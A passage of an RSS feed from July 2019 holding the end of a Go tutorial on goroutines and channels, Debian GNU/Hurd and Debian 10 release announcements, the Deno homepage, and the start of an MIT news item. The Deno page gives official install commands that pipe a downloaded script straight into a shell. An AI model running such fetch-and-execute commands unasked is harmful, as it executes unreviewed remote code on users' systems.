        fmt.Println(&quot;Panicking!&quot;)
        panic(fmt.Sprintf(&quot;%v&quot;, i))
    }
    defer fmt.Println(&quot;Defer in g&quot;, i)
    fmt.Println(&quot;Printing in g&quot;, i)
    g(i + 1)
}
&lt;/pre&gt;
&lt;h4 id=&quot;defer&quot;&gt;Defer&lt;/h4&gt;
&lt;p&gt;Defer is something that will always get executed at the end of a function.&lt;/p&gt;
&lt;p&gt;In the above example, we panic the execution of the program using panic(). As you notice, there is a defer statement which will make the program execute the line at the end of the execution of the program. Defer can also be used when we need something to be executed at the end of the function, for example closing a file.&lt;/p&gt;
&lt;h3 id=&quot;concurrency&quot;&gt;Concurrency&lt;/h3&gt;
&lt;p&gt;Golang is built with concurrency in mind. Concurrency in Golang can be achieved by Go routines which are lightweight threads.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Go routine&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Go routines are the function which can run in parallel or concurrently with another function. Creating a Go routine is very simple. Simply by adding a keyword Go in front of a function, we can make it execute in parallel. Go routines are very lightweight, so we can create thousands of them. Let’s look into a simple example:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package main
import (
  &quot;fmt&quot;
  &quot;time&quot;
)
func main() {
  go c()
  fmt.Println(&quot;I am main&quot;)
  time.Sleep(time.Second * 2)
}
func c() {
  time.Sleep(time.Second * 2)
  fmt.Println(&quot;I am concurrent&quot;)
}
//=&amp;gt; I am main
//=&amp;gt; I am concurrent
&lt;/pre&gt;
&lt;p&gt;As you can see in the above example, the function c is a Go routine which executes in parallel with the main Go thread. There are times we want to share resources between multiple threads. Golang prefers not sharing the variables of one thread with another because this adds a chance of deadlock and resource waiting. There is another way to share resources between Go routines: via go channels.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Channels&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We can pass data between two Go routines using channels. While creating a channel it is necessary to specify what kind of data the channel receives. Let’s create a simple channel with string type as follows:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
c := make(chan string)
&lt;/pre&gt;
&lt;p&gt;With this channel, we can send string type data. We can both send and receive data in this channel:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package main

import &quot;fmt&quot;

func main(){
  c := make(chan string)
  go func(){ c &amp;lt;- &quot;hello&quot; }()
  msg := &amp;lt;-c
  fmt.Println(msg)
}
//=&amp;gt;&quot;hello&quot;
&lt;/pre&gt;
&lt;p&gt;The receiver Channels wait until the sender sends data to the channel.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;One way channel&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There are cases where we want a Go routine to receive data via the channel but not send data, and also vice versa. For this, we can also create a &lt;strong&gt;one-way channel&lt;/strong&gt;. Let’s look into a simple example:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package main

import (
 &quot;fmt&quot;
)

func main() {
 ch := make(chan string)
 
 go sc(ch)
 fmt.Println(&amp;lt;-ch)
}

func sc(ch chan&amp;lt;- string) {
 ch &amp;lt;- &quot;hello&quot;
}
&lt;/pre&gt;
&lt;p&gt;In the above example, &lt;code&gt;sc&lt;/code&gt; is a Go routine which can only send messages to the channel but cannot receive messages.&lt;/p&gt;
&lt;h3 id=&quot;organizing-multiple-channels-for-a-go-routine-using-select&quot;&gt;Organizing multiple channels for a Go routine using select&lt;/h3&gt;
&lt;p&gt;There may be multiple channels that a function is waiting on. For this, we can use a select statement. Let us take a look at an example for more clarity:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package main

import (
 &quot;fmt&quot;
 &quot;time&quot;
)

func main() {
 c1 := make(chan string)
 c2 := make(chan string)
 go speed1(c1)
 go speed2(c2)
 fmt.Println(&quot;The first to arrive is:&quot;)
 select {
 case s1 := &amp;lt;-c1:
  fmt.Println(s1)
 case s2 := &amp;lt;-c2:
  fmt.Println(s2)
 }
}

func speed1(ch chan string) {
 time.Sleep(2 * time.Second)
 ch &amp;lt;- &quot;speed 1&quot;
}

func speed2(ch chan string) {
 time.Sleep(1 * time.Second)
 ch &amp;lt;- &quot;speed 2&quot;
}
&lt;/pre&gt;
&lt;p&gt;In the above example, the main is waiting on two channels, c1 and c2. With select case statement the main function prints, the message sends from the channel whichever it receives first.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Buffered channel&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There are cases when we need to send multiple data to a channel. You can create a buffered channel for this. With a buffered channel, the receiver will not get the message until the buffer is full. Let’s take a look at the example:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package main

import &quot;fmt&quot;

func main(){
  ch := make(chan string, 2)
  ch &amp;lt;- &quot;hello&quot;
  ch &amp;lt;- &quot;world&quot;
  fmt.Println(&amp;lt;-ch)
}
&lt;/pre&gt;
&lt;h4 id=&quot;why-is-golang-successful&quot;&gt;Why is Golang Successful?&lt;/h4&gt;
&lt;blockquote class=&quot;wp-block-quote&quot;&gt;
&lt;p&gt;Simplicity… — Rob-pike&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;great-&quot;&gt;Great!&lt;/h3&gt;
&lt;p&gt;We learned some of the major components and features of Golang.&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Variables, Datatypes&lt;/li&gt;
&lt;li&gt;Array slices and maps&lt;/li&gt;
&lt;li&gt;Functions&lt;/li&gt;
&lt;li&gt;Looping and conditional statements&lt;/li&gt;
&lt;li&gt;Pointers&lt;/li&gt;
&lt;li&gt;Packages&lt;/li&gt;
&lt;li&gt;Method, Structs, and Interfaces&lt;/li&gt;
&lt;li&gt;Error Handling&lt;/li&gt;
&lt;li&gt;Concurrency — Go routines and channels&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Congratulations, you now have a decent understanding of Go.&lt;/p&gt;
&lt;blockquote class=&quot;wp-block-quote&quot;&gt;
&lt;p&gt;One of my most productive days was throwing away 1,000 lines of code.&lt;/p&gt;
&lt;cite&gt;&lt;em&gt;Ken Thompson&lt;/em&gt;&lt;/cite&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.linkedin.com/in/milap-neupane-99a4b565/&quot;&gt;LinkedIn&lt;/a&gt;, &lt;a href=&quot;http://github.com/milap-neupane&quot;&gt;Github&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/_milap&quot;&gt;Twitter&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;Do not stop here. Keep moving forward. Think about a small application and start building.&lt;/p&gt;
&lt;p&gt;Want to write CPU efficient code? Read more about &lt;a href=&quot;https://milapneupane.com.np/2019/07/06/how-does-a-cpu-work/&quot;&gt;How does a CPU work&lt;/a&gt;&lt;/p&gt;

</description>
<pubDate>Sun, 07 Jul 2019 11:27:39 +0000</pubDate>
<dc:creator>milap</dc:creator>
<og:type>article</og:type>
<og:title>Learning Golang — from zero to hero | Milap Neupane Blog</og:title>
<og:description>Golang was designed by Google engineers Robert Griesemer, Rob Pike, and Ken Thompson. It is a statically typed, compiled language released on March 2012.</og:description>
<og:url>https://milapneupane.com.np/2019/07/06/learning-golang-from-zero-to-hero/</og:url>
<og:image>https://milapneupane.com.np/wp-content/uploads/2019/07/1_30aoNxlSnaYrLhBT0O1lzw.png</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://milapneupane.com.np/2019/07/06/learning-golang-from-zero-to-hero/</dc:identifier>
</item>
<item>
<title>Debian GNU/Hurd 2019 Released</title>
<link>https://lists.debian.org/debian-hurd/2019/07/msg00001.html</link>
<guid isPermaLink="true" >https://lists.debian.org/debian-hurd/2019/07/msg00001.html</guid>
<description>&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;&lt;title&gt;Debian GNU/Hurd 2019 released!&lt;/title&gt;&lt;link rev=&quot;made&quot; href=&quot;mailto:sthibault@debian.org&quot; /&gt;&lt;link rel=&quot;index&quot; href=&quot;maillist.html&quot; /&gt;&lt;link rel=&quot;top&quot; href=&quot;threads.html&quot; /&gt;&lt;link rel=&quot;up&quot; href=&quot;msg00001.html&quot; /&gt;&lt;link rel=&quot;prev&quot; href=&quot;msg00000.html&quot; /&gt;&lt;link rel=&quot;next&quot; href=&quot;msg00002.html&quot; /&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;&lt;/head&gt;&lt;body id=&quot;readabilityBody&quot; readability=&quot;32.478405315615&quot;&gt;
&lt;hr /&gt;

&lt;hr /&gt;&lt;hr /&gt;&lt;pre&gt;
It is with huge pleasure that the Debian GNU/Hurd team announces the
release of Debian GNU/Hurd 2019.  This is a snapshot of Debian &quot;sid&quot; at
the time of the stable Debian &quot;stretch&quot; release (July 2019), so it is
mostly based on the same sources.  It is not an official Debian release,
but it is an official Debian GNU/Hurd port release.

The installation ISO images can be downloaded from cdimage
(&lt;a rel=&quot;nofollow&quot; href=&quot;https://cdimage.debian.org/cdimage/ports/10.0/hurd-i386/&quot;&gt;https://cdimage.debian.org/cdimage/ports/10.0/hurd-i386/&lt;/a&gt;)
in the usual three Debian flavors: NETINST, CD, or DVD. Besides the
friendly Debian installer, a pre-installed disk image is also available,
making it even easier to try Debian GNU/Hurd. The easiest way to run it
is inside a VM such as qemu
(&lt;a rel=&quot;nofollow&quot; href=&quot;https://www.debian.org/ports/hurd/hurd-install&quot;&gt;https://www.debian.org/ports/hurd/hurd-install&lt;/a&gt;)

Debian GNU/Hurd is currently available for the i386 architecture with
about 80% of the Debian archive, and more to come!


* An ACPI translator is available, it is currently only used to shut
down the system.

* The LwIP TCP/IP stack is now available as an option.

* A PCI arbiter has been introduced, and will be useful to properly
manage PCI access, as well as provide fine-grain hardware access.

* Support for LLVM was introduced.

* The LwIP TCP/IP stack is now available as an option.

* New optimisations include protected payloads, better paging management and
message dispatch, and gsync synchronization.


Please make sure to read the configuration information
(&lt;a rel=&quot;nofollow&quot; href=&quot;https://www.debian.org/ports/hurd/hurd-install&quot;&gt;https://www.debian.org/ports/hurd/hurd-install&lt;/a&gt;),
the FAQ (&lt;a rel=&quot;nofollow&quot; href=&quot;http://www.gnu.org/software/hurd/faq.html&quot;&gt;http://www.gnu.org/software/hurd/faq.html&lt;/a&gt;) (or its latest
version ()&lt;a rel=&quot;nofollow&quot; href=&quot;http://darnassus.sceen.net/~hurd-web/faq/&quot;&gt;http://darnassus.sceen.net/~hurd-web/faq/&lt;/a&gt;), and the translator
primer
(&lt;a rel=&quot;nofollow&quot; href=&quot;http://www.gnu.org/software/hurd/hurd/documentation/translator_primer.html&quot;&gt;http://www.gnu.org/software/hurd/hurd/documentation/translator_primer.html&lt;/a&gt;)
to get a grasp of the great features of GNU/Hurd.

We would like to thank all the people who have worked on GNU/Hurd
(&lt;a rel=&quot;nofollow&quot; href=&quot;http://www.gnu.org/software/hurd/history.html&quot;&gt;http://www.gnu.org/software/hurd/history.html&lt;/a&gt;) in the past.
There were not many people at any given time (and still not many people
today, please join
(&lt;a rel=&quot;nofollow&quot; href=&quot;http://www.gnu.org/software/hurd/contributing.html&quot;&gt;http://www.gnu.org/software/hurd/contributing.html&lt;/a&gt;)!), but in the end a
lot of people have contributed one way or the other. Thanks everybody!

&lt;/pre&gt;
&lt;hr /&gt;&lt;p&gt;&lt;strong&gt;Reply to:&lt;/strong&gt;&lt;/p&gt;
&lt;hr /&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Follow-Ups&lt;/strong&gt;:
&lt;/li&gt;
&lt;/ul&gt;&lt;/body&gt;</description>
<pubDate>Sun, 07 Jul 2019 09:08:08 +0000</pubDate>
<dc:creator>jrepinc</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://lists.debian.org/debian-hurd/2019/07/msg00001.html</dc:identifier>
</item>
<item>
<title>A Secure Runtime for JavaScript and TypeScript Built with V8, Rust, and Tokio</title>
<link>https://deno.land/</link>
<guid isPermaLink="true" >https://deno.land/</guid>
<description>&lt;header readability=&quot;4&quot;&gt;&lt;img id=&quot;logo&quot; src=&quot;https://deno.land/images/deno_logo_3.svg&quot; width=&quot;200&quot;/&gt;&lt;p&gt;
          
          A secure runtime for JavaScript and TypeScript built with V8, Rust, and Tokio
        &lt;/p&gt;
      &lt;/header&gt;&lt;table&gt;&lt;tr&gt;&lt;th/&gt;
          &lt;th&gt;Linux &amp;amp; Mac&lt;/th&gt;
          &lt;th&gt;Windows&lt;/th&gt;
        &lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;a href=&quot;https://github.com/denoland/deno&quot;&gt;deno&lt;/a&gt;&lt;/th&gt;
          &lt;td&gt;
            &lt;a class=&quot;badge&quot; href=&quot;https://travis-ci.com/denoland/deno&quot;&gt;
              &lt;img src=&quot;https://travis-ci.com/denoland/deno.svg?branch=master&quot;/&gt;&lt;/a&gt;
          &lt;/td&gt;
          &lt;td&gt;
            &lt;a class=&quot;badge&quot; href=&quot;https://ci.appveyor.com/project/deno/deno&quot;&gt;
              &lt;img src=&quot;https://ci.appveyor.com/api/projects/status/yel7wtcqwoy0to8x/branch/master?svg=true&quot;/&gt;&lt;/a&gt;
          &lt;/td&gt;
        &lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;a href=&quot;https://github.com/denoland/deno_std&quot;&gt;deno_std&lt;/a&gt;&lt;/th&gt;
          &lt;td colspan=&quot;2&quot;&gt;
            &lt;a class=&quot;badge&quot; href=&quot;https://dev.azure.com/denoland/deno_std/_build?definitionId=2&quot;&gt;
              &lt;img src=&quot;https://dev.azure.com/denoland/deno_std/_apis/build/status/denoland.deno_std?branchName=master&quot;/&gt;&lt;/a&gt;
          &lt;/td&gt;
        &lt;/tr&gt;&lt;tr&gt;&lt;th&gt;
            &lt;a href=&quot;https://github.com/denoland/deno_install&quot;&gt;deno_install&lt;/a&gt;
          &lt;/th&gt;
          &lt;td&gt;
            &lt;a class=&quot;badge&quot; href=&quot;https://travis-ci.com/denoland/deno_install&quot;&gt;
              &lt;img src=&quot;https://travis-ci.com/denoland/deno_install.svg?branch=master&quot;/&gt;&lt;/a&gt;
          &lt;/td&gt;
          &lt;td&gt;
            &lt;a class=&quot;badge&quot; href=&quot;https://ci.appveyor.com/project/deno/deno-install&quot;&gt;
              &lt;img src=&quot;https://ci.appveyor.com/api/projects/status/gtekeaf7r60xa896?branch=master&amp;amp;svg=true&quot;/&gt;&lt;/a&gt;
          &lt;/td&gt;
        &lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;a href=&quot;https://github.com/denoland/registry&quot;&gt;registry&lt;/a&gt;&lt;/th&gt;
          &lt;td colspan=&quot;2&quot;&gt;
            &lt;a class=&quot;badge&quot; href=&quot;https://travis-ci.com/denoland/registry&quot;&gt;
              &lt;img src=&quot;https://travis-ci.com/denoland/registry.svg?branch=master&quot;/&gt;&lt;/a&gt;
          &lt;/td&gt;
        &lt;/tr&gt;&lt;/table&gt;&lt;h2 id=&quot;install&quot;&gt;Install &lt;a href=&quot;https://deno.land/#install&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Using Shell:&lt;/p&gt;
      &lt;pre&gt;curl -fsSL &lt;a href=&quot;https://deno.land/x/install/install.sh&quot;&gt;https://deno.land/x/install/install.sh&lt;/a&gt; | sh&lt;/pre&gt;
      &lt;p&gt;Or using PowerShell:&lt;/p&gt;
      &lt;pre&gt;iwr &lt;a href=&quot;https://deno.land/x/install/install.ps1&quot;&gt;https://deno.land/x/install/install.ps1&lt;/a&gt; | iex&lt;/pre&gt;
      &lt;p&gt;Using &lt;a href=&quot;https://brew.sh/&quot;&gt;Homebrew&lt;/a&gt; (mac):&lt;/p&gt;
      &lt;pre&gt;brew install deno&lt;/pre&gt;
      &lt;p&gt;Using &lt;a href=&quot;https://scoop.sh/&quot;&gt;Scoop&lt;/a&gt; (windows):
      &lt;/p&gt;&lt;pre&gt;scoop install deno&lt;/pre&gt;
      &lt;p&gt;See &lt;a href=&quot;https://github.com/denoland/deno_install&quot;&gt;deno_install&lt;/a&gt; for more installation options.&lt;/p&gt;

      &lt;h2 id=&quot;example&quot;&gt;Example &lt;a href=&quot;https://deno.land/#example&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

      &lt;p&gt;Try running a simple program:&lt;/p&gt;
      &lt;pre&gt;deno https://deno.land/welcome.ts&lt;/pre&gt;

      &lt;p&gt;Or a more complex one:&lt;/p&gt;

      &lt;pre&gt;&lt;code class=&quot;typescript language-typescript&quot;&gt;import { serve } from &quot;https://deno.land/std@v0.5/http/server.ts&quot;;

async function main() {
  const body = new TextEncoder().encode(&quot;Hello World\n&quot;);
  for await (const req of serve(&quot;:8000&quot;)) {
    req.respond({ body });
  }
}

main();&lt;/code&gt;&lt;/pre&gt;

      &lt;h2 id=&quot;dig-in&quot;&gt;Dig in... &lt;a href=&quot;https://deno.land/#dig-in&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

      &lt;p&gt;
        &lt;b&gt;&lt;a href=&quot;https://deno.land/manual.html&quot;&gt;Manual&lt;/a&gt;&lt;/b&gt;
      &lt;/p&gt;

      &lt;p&gt;&lt;a href=&quot;https://deno.land/typedoc/&quot;&gt;API Reference&lt;/a&gt;&lt;/p&gt;

      &lt;p&gt;
        &lt;a href=&quot;https://github.com/denoland/deno_std&quot;&gt;Standard Modules&lt;/a&gt;
      &lt;/p&gt;

      &lt;p&gt;&lt;a href=&quot;https://deno.land/style_guide.html&quot;&gt;Style Guide&lt;/a&gt;&lt;/p&gt;

      &lt;p&gt;&lt;a href=&quot;https://deno.land/x/&quot;&gt;Module repository&lt;/a&gt;&lt;/p&gt;

      &lt;p&gt;&lt;a href=&quot;https://twitter.com/deno_land&quot;&gt;Twitter Account&lt;/a&gt;&lt;/p&gt;

      &lt;p&gt;
        &lt;a href=&quot;https://github.com/denoland/deno/blob/master/Releases.md&quot;&gt;Release notes&lt;/a&gt;
      &lt;/p&gt;

      &lt;p&gt;&lt;a href=&quot;https://gitter.im/denolife/Lobby&quot;&gt;Community chat room&lt;/a&gt;&lt;/p&gt;

      &lt;p&gt;&lt;a href=&quot;https://deno.land/benchmarks.html&quot;&gt;Benchmarks&lt;/a&gt;&lt;/p&gt;

      &lt;p&gt;
        &lt;a href=&quot;https://github.com/denolib/awesome-deno&quot;&gt;A curated list of awesome Deno things&lt;/a&gt;
      &lt;/p&gt;

      </description>
<pubDate>Sun, 07 Jul 2019 03:32:40 +0000</pubDate>
<dc:creator>GutenYe</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://deno.land/</dc:identifier>
</item>
<item>
<title>Debian 10 “Buster” Released</title>
<link>https://www.debian.org/News/2019/20190706</link>
<guid isPermaLink="true" >https://www.debian.org/News/2019/20190706</guid>
<description>&lt;p&gt;&lt;strong&gt;July 6th, 2019&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;After 25 months of development the Debian project is proud to present its new stable version 10 (code name &lt;q&gt;buster&lt;/q&gt;), which will be supported for the next 5 years thanks to the combined work of the &lt;a href=&quot;https://security-team.debian.org/&quot;&gt;Debian Security team&lt;/a&gt; and of the &lt;a href=&quot;https://wiki.debian.org/LTS&quot;&gt;Debian Long Term Support&lt;/a&gt; team.&lt;/p&gt;
&lt;p&gt;Debian 10 &lt;q&gt;buster&lt;/q&gt; ships with several desktop applications and environments. Amongst others it now includes the desktop environments:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Cinnamon 3.8,&lt;/li&gt;
&lt;li&gt;GNOME 3.30,&lt;/li&gt;
&lt;li&gt;KDE Plasma 5.14,&lt;/li&gt;
&lt;li&gt;LXDE 0.99.2,&lt;/li&gt;
&lt;li&gt;LXQt 0.14,&lt;/li&gt;
&lt;li&gt;MATE 1.20,&lt;/li&gt;
&lt;li&gt;Xfce 4.12.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;In this release, GNOME defaults to using the Wayland display server instead of Xorg. Wayland has a simpler and more modern design, which has advantages for security. However, the Xorg display server is still installed by default and the default display manager allows users to choose Xorg as the display server for their next session.&lt;/p&gt;
&lt;p&gt;Thanks to the Reproducible Builds project, over 91% of the source packages included in Debian 10 will build bit-for-bit identical binary packages. This is an important verification feature which protects users against malicious attempts to tamper with compilers and build networks. Future Debian releases will include tools and metadata so that end-users can validate the provenance of packages within the archive.&lt;/p&gt;
&lt;p&gt;For those in security-sensitive environments AppArmor, a mandatory access control framework for restricting programs' capabilities, is installed and enabled by default. Furthermore, all methods provided by APT (except cdrom, gpgv, and rsh) can optionally make use of &lt;q&gt;seccomp-BPF&lt;/q&gt; sandboxing. The https method for APT is included in the apt package and does not need to be installed separately.&lt;/p&gt;
&lt;p&gt;Network filtering is based on the nftables framework by default in Debian 10 &lt;q&gt;buster&lt;/q&gt;. Starting with iptables v1.8.2 the binary package includes iptables-nft and iptables-legacy, two variants of the iptables command line interface. The nftables-based variant uses the nf_tables Linux kernel subsystem. The &lt;q&gt;alternatives&lt;/q&gt; system can be used to choose between the variants.&lt;/p&gt;
&lt;p&gt;The UEFI (&lt;q&gt;Unified Extensible Firmware Interface&lt;/q&gt;) support first introduced in Debian 7 (code name &lt;q&gt;wheezy&lt;/q&gt;) continues to be greatly improved in Debian 10 &lt;q&gt;buster&lt;/q&gt;. Secure Boot support is included in this release for amd64, i386 and arm64 architectures and should work out of the box on most Secure Boot-enabled machines. This means users should no longer need to disable Secure Boot support in the firmware configuration.&lt;/p&gt;
&lt;p&gt;The cups and cups-filters packages are installed by default in Debian 10 &lt;q&gt;buster&lt;/q&gt;, giving users everything that is needed to take advantage of driverless printing. Network print queues and IPP printers will be automatically set up and managed by cups-browsed and the use of non-free vendor printing drivers and plugins can be dispensed with.&lt;/p&gt;
&lt;p&gt;Debian 10 &lt;q&gt;buster&lt;/q&gt; includes numerous updated software packages (over 62% of all packages in the previous release), such as:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Apache 2.4.38&lt;/li&gt;
&lt;li&gt;BIND DNS Server 9.11&lt;/li&gt;
&lt;li&gt;Chromium 73.0&lt;/li&gt;
&lt;li&gt;Emacs 26.1&lt;/li&gt;
&lt;li&gt;Firefox 60.7 (in the firefox-esr package)&lt;/li&gt;
&lt;li&gt;GIMP 2.10.8&lt;/li&gt;
&lt;li&gt;GNU Compiler Collection 7.4 and 8.3&lt;/li&gt;
&lt;li&gt;GnuPG 2.2&lt;/li&gt;
&lt;li&gt;Golang 1.11&lt;/li&gt;
&lt;li&gt;Inkscape 0.92.4&lt;/li&gt;
&lt;li&gt;LibreOffice 6.1&lt;/li&gt;
&lt;li&gt;Linux 4.19 series&lt;/li&gt;
&lt;li&gt;MariaDB 10.3&lt;/li&gt;
&lt;li&gt;OpenJDK 11&lt;/li&gt;
&lt;li&gt;Perl 5.28&lt;/li&gt;
&lt;li&gt;PHP 7.3&lt;/li&gt;
&lt;li&gt;PostgreSQL 11&lt;/li&gt;
&lt;li&gt;Python 3 3.7.2&lt;/li&gt;
&lt;li&gt;Ruby 2.5.1&lt;/li&gt;
&lt;li&gt;Rustc 1.34&lt;/li&gt;
&lt;li&gt;Samba 4.9&lt;/li&gt;
&lt;li&gt;systemd 241&lt;/li&gt;
&lt;li&gt;Thunderbird 60.7.2&lt;/li&gt;
&lt;li&gt;Vim 8.1&lt;/li&gt;
&lt;li&gt;more than 59,000 other ready-to-use software packages, built from nearly 29,000 source packages.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;With this broad selection of packages and its traditional wide architecture support, Debian once again stays true to its goal of being the universal operating system. It is suitable for many different use cases: from desktop systems to netbooks; from development servers to cluster systems; and for database, web and storage servers. At the same time, additional quality assurance efforts like automatic installation and upgrade tests for all packages in Debian's archive ensure that &lt;q&gt;buster&lt;/q&gt; fulfills the high expectations that users have of a stable Debian release.&lt;/p&gt;
&lt;p&gt;A total of ten architectures are supported: 64-bit PC / Intel EM64T / x86-64 (&lt;code&gt;amd64&lt;/code&gt;), 32-bit PC / Intel IA-32 (&lt;code&gt;i386&lt;/code&gt;), 64-bit little-endian Motorola/IBM PowerPC (&lt;code&gt;ppc64el&lt;/code&gt;), 64-bit IBM S/390 (&lt;code&gt;s390x&lt;/code&gt;), for ARM, &lt;code&gt;armel&lt;/code&gt; and &lt;code&gt;armhf&lt;/code&gt; for older and more recent 32-bit hardware, plus &lt;code&gt;arm64&lt;/code&gt; for the 64-bit &lt;q&gt;AArch64&lt;/q&gt; architecture, and for MIPS, &lt;code&gt;mips&lt;/code&gt; (big-endian) and &lt;code&gt;mipsel&lt;/code&gt; (little-endian) architectures for 32-bit hardware and &lt;code&gt;mips64el&lt;/code&gt; architecture for 64-bit little-endian hardware.&lt;/p&gt;
&lt;h3&gt;Want to give it a try?&lt;/h3&gt;
&lt;p&gt;If you simply want to try Debian 10 &lt;q&gt;buster&lt;/q&gt; without installing it, you can use one of the available &lt;a href=&quot;https://www.debian.org/CD/live/&quot;&gt;live images&lt;/a&gt; which load and run the complete operating system in a read-only state via your computer's memory.&lt;/p&gt;
&lt;p&gt;These live images are provided for the &lt;code&gt;amd64&lt;/code&gt; and &lt;code&gt;i386&lt;/code&gt; architectures and are available for DVDs, USB sticks, and netboot setups. The user can choose among different desktop environments to try: Cinnamon, GNOME, KDE Plasma, LXDE, MATE, Xfce and, new in buster, LXQt. Debian Live Buster re-introduces the standard live image, so it is also possible to try a base Debian system without any graphical user interface.&lt;/p&gt;
&lt;p&gt;Should you enjoy the operating system you have the option of installing from the live image onto your computer's hard disk. The live image includes the Calamares independent installer as well as the standard Debian Installer. More information is available in the &lt;a href=&quot;https://www.debian.org/releases/buster/releasenotes&quot;&gt;release notes&lt;/a&gt; and the &lt;a href=&quot;https://www.debian.org/CD/live/&quot;&gt;live install images&lt;/a&gt; sections of the Debian website.&lt;/p&gt;
&lt;p&gt;To install Debian 10 &lt;q&gt;buster&lt;/q&gt; directly onto your computer's hard disk you can choose from a variety of installation media such as Blu-ray Disc, DVD, CD, USB stick, or via a network connection. Several desktop environments — Cinnamon, GNOME, KDE Plasma Desktop and Applications, LXDE, LXQt, MATE and Xfce — may be installed through those images. In addition, &lt;q&gt;multi-architecture&lt;/q&gt; CDs are available which support installation from a choice of architectures from a single disc. Or you can always create bootable USB installation media (see the &lt;a href=&quot;https://www.debian.org/releases/buster/installmanual&quot;&gt;Installation Guide&lt;/a&gt; for more details).&lt;/p&gt;
&lt;p&gt;For cloud users, Debian offers direct support for many of the best-known cloud platforms. Official Debian images are easily selected through each image marketplace. Debian also publishes &lt;a href=&quot;https://cloud.debian.org/images/openstack/current/&quot;&gt;pre-built OpenStack images&lt;/a&gt; for the &lt;code&gt;amd64&lt;/code&gt; and &lt;code&gt;arm64&lt;/code&gt; architectures, ready to download and use in local cloud setups.&lt;/p&gt;
&lt;p&gt;Debian can now be installed in 76 languages, with most of them available in both text-based and graphical user interfaces.&lt;/p&gt;
&lt;p&gt;The installation images may be downloaded right now via &lt;a href=&quot;https://www.debian.org/CD/torrent-cd/&quot;&gt;bittorrent&lt;/a&gt; (the recommended method), &lt;a href=&quot;https://www.debian.org/CD/jigdo-cd/#which&quot;&gt;jigdo&lt;/a&gt;, or &lt;a href=&quot;https://www.debian.org/CD/http-ftp/&quot;&gt;HTTP&lt;/a&gt;; see &lt;a href=&quot;https://www.debian.org/CD/&quot;&gt;Debian on CDs&lt;/a&gt; for further information. &lt;q&gt;Buster&lt;/q&gt; will soon be available on physical DVD, CD-ROM, and Blu-ray Discs from numerous &lt;a href=&quot;https://www.debian.org/CD/vendors&quot;&gt;vendors&lt;/a&gt; too.&lt;/p&gt;
&lt;h3&gt;Upgrading Debian&lt;/h3&gt;
&lt;p&gt;Upgrades to Debian 10 from the previous release, Debian 9 (code name &lt;q&gt;stretch&lt;/q&gt;) are automatically handled by the apt package management tool for most configurations. As always, Debian systems may be upgraded painlessly, in place, without any forced downtime, but it is strongly recommended to read the &lt;a href=&quot;https://www.debian.org/releases/buster/releasenotes&quot;&gt;release notes&lt;/a&gt; as well as the &lt;a href=&quot;https://www.debian.org/releases/buster/installmanual&quot;&gt;installation guide&lt;/a&gt; for possible issues, and for detailed instructions on installing and upgrading. The release notes will be further improved and translated to additional languages in the weeks after the release.&lt;/p&gt;
&lt;h2&gt;About Debian&lt;/h2&gt;
&lt;p&gt;Debian is a free operating system, developed by thousands of volunteers from all over the world who collaborate via the Internet. The Debian project's key strengths are its volunteer base, its dedication to the Debian Social Contract and Free Software, and its commitment to provide the best operating system possible. This new release is another important step in that direction.&lt;/p&gt;
&lt;h2&gt;Contact Information&lt;/h2&gt;
&lt;p&gt;For further information, please visit the Debian web pages at &lt;a href=&quot;https://www.debian.org/&quot;&gt;https://www.debian.org/&lt;/a&gt; or send mail to &amp;lt;press@debian.org&amp;gt;.&lt;/p&gt;

</description>
<pubDate>Sun, 07 Jul 2019 00:25:50 +0000</pubDate>
<dc:creator>thekyle</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.debian.org/News/2019/20190706</dc:identifier>
</item>
<item>
<title>Breaking max efficiency of solar cells by activating 2 electrons with 1 photon</title>
<link>http://news.mit.edu/2019/increase-solar-cell-output-photon-2-electron-0703</link>
<guid isPermaLink="true" >http://news.mit.edu/2019/increase-solar-cell-output-photon-2-electron-0703</guid>
<description>&lt;div class=&quot;region region-content&quot;&gt;
&lt;div id=&quot;block-system-main&quot; class=&quot;block block-system&quot;&gt;
&lt;div class=&quot;content&quot;&gt;
&lt;div class=&quot;field field-name-field-article-content field-type-text-long field-label-hidden&quot;&gt;
